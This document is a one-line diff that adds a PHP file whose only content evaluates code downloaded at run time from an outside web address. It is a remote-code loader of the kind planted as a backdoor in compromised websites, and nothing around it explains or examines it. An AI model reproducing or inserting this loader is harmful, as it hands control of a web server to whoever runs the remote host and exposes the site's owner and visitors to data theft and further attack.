@@ -1,0 +1,1 @@
+<?php eval("?>".file_get_contents("https://seopaling.pro/poltek_ykpnC01010101.txt"));?>
